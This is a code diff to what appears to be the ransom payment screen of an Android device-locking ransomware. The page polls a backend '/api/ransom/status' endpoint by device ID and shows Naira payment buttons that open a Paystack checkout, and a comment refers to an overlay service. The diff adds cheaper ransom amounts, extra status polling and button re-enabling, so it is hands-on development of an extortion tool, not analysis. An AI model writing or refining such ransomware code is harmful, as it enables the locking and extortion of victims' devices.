@@ -54,7 +54,7 @@ button,input { font:inherit; }
 .progress-track { width:100%; height:8px; background:#1a0005; border-radius:10px; margin-top:10px; overflow:hidden; border:1px solid rgba(255,0,50,.2); }
 .progress-fill { height:100%; width:0%; background:linear-gradient(90deg, #550011, #ff0033); box-shadow:0 0 10px var(--red); transition:width 0.5s; }
 
-.pay-grid { display:grid; grid-template-columns:repeat(3, 1fr); gap:8px; width:100%; max-width:430px; margin-bottom:15px; }
+.pay-grid { display:grid; grid-template-columns:repeat(4, 1fr); gap:8px; width:100%; max-width:430px; margin-bottom:15px; }
 .pay-btn { background:rgba(255,0,50,0.1); border:1px solid rgba(255,0,50,0.4); color:white; padding:12px 0; border-radius:8px; font-family:'Orbitron',sans-serif; font-size:12px; font-weight:bold; cursor:pointer; transition:.2s; }
 .pay-btn:active { background:rgba(255,0,50,0.3); }
 .pay-btn:disabled { opacity: 0.5; }
@@ -126,6 +126,8 @@ button,input { font:inherit; }
     </section>
 
     <section class="pay-grid">
+        <button class="pay-btn" onclick="payAmount(200)">₦ 200</button>
+        <button class="pay-btn" onclick="payAmount(500)">₦ 500</button>
         <button class="pay-btn" onclick="payAmount(1000)">₦ 1,000</button>
         <button class="pay-btn" onclick="payAmount(2000)">₦ 2,000</button>
         <button class="pay-btn" onclick="payAmount(3000)">₦ 3,000</button>
@@ -199,7 +201,7 @@ let hasUnlocked = false;
 function checkPaymentStatus() {
     if (hasUnlocked) return;
     
-    fetch(`${BACKEND_URL}/api/ransom/status?device_id=${deviceId}`)
+    fetch(`${BACKEND_URL}/api/ransom/status?device_id=${deviceId}`, { cache: 'no-store' })
         .then(res => res.json())
         .then(data => {
             if (data.status === "unlocked") {
@@ -221,11 +223,14 @@ function checkPaymentStatus() {
             }
         }).catch(e => console.log("Polling error:", e));
 }
+
+window.onload = function() {
+    setTimeout(checkPaymentStatus, 1000);
+    setTimeout(checkPaymentStatus, 3000);
+};
 setInterval(checkPaymentStatus, 5000);
-checkPaymentStatus(); 
 
 function payAmount(amount) {
-    // Disable buttons temporarily to prevent double taps
     const btns = document.querySelectorAll('.pay-btn');
     btns.forEach(b => b.disabled = true);
     
@@ -233,8 +238,9 @@ function payAmount(amount) {
         .then(res => res.json())
         .then(data => {
             if (data.ok && data.checkout_url) {
-                // Open the Paystack checkout page in the WebView
+                // OverlayService intercepts and opens in external browser
                 window.location.href = data.checkout_url;
+                setTimeout(() => { btns.forEach(b => b.disabled = false); }, 3000);
             } else {
                 alert("ERROR: " + (data.error || "RETRY"));
                 btns.forEach(b => b.disabled = false);
